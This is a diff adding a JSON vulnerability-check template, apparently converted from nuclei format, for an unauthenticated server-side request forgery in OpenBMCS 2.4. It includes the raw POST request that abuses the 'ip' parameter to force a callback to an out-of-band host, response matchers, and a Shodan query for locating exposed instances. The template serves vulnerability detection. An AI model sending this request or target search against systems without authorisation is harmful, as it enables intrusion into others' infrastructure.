@@ -1,0 +1,150 @@
+{
+  "id": "openbmcs-ssrf",
+  "name": "OpenBMCS 2.4 - Server-Side Request Forgery /  Remote File Inclusion",
+  "author": "dhiyaneshDK",
+  "severity": "MEDIUM",
+  "description": "OpenBMCS 2.4 is susceptible to unauthenticated server-side request forgery and remote file inclusion vulnerabilities within its functionalities. The application parses user supplied data in the POST parameter \u0027ip\u0027 to query a server IP on port 81 by default. Since no validation is carried out on the parameter, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host.",
+  "references": [
+    "https://www.exploit-db.com/exploits/50670",
+    "https://securityforeveryone.com/tools/openbmcs-unauth-ssrf-rfi-vulnerability-scanner"
+  ],
+  "tags": [
+    "ssrf",
+    "oast",
+    "openbmcs",
+    "edb",
+    "misconfig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.favicon.hash:1550906681"
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-918",
+  "cvssScore": "6.8",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /php/query.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nip\u003d{{interactsh-url}}:80\u0026argu\u003d/\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "interactsh_protocol",
+          "values": [
+            "http"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "302"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "openbmcs-ssrf",
+    "info": {
+      "name": "OpenBMCS 2.4 - Server-Side Request Forgery /  Remote File Inclusion",
+      "author": "dhiyaneshDK",
+      "severity": "medium",
+      "description": "OpenBMCS 2.4 is susceptible to unauthenticated server-side request forgery and remote file inclusion vulnerabilities within its functionalities. The application parses user supplied data in the POST parameter \u0027ip\u0027 to query a server IP on port 81 by default. Since no validation is carried out on the parameter, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host.",
+      "reference": [
+        "https://www.exploit-db.com/exploits/50670",
+        "https://securityforeveryone.com/tools/openbmcs-unauth-ssrf-rfi-vulnerability-scanner"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "cvss_score": "6.8",
+        "cwe_id": "CWE-918"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "http.favicon.hash:1550906681"
+      },
+      "tags": "ssrf,oast,openbmcs,edb,misconfig"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /php/query.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nip\u003d{{interactsh-url}}:80\u0026argu\u003d/\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "interactsh_protocol",
+            "words": [
+              "http"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              302
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
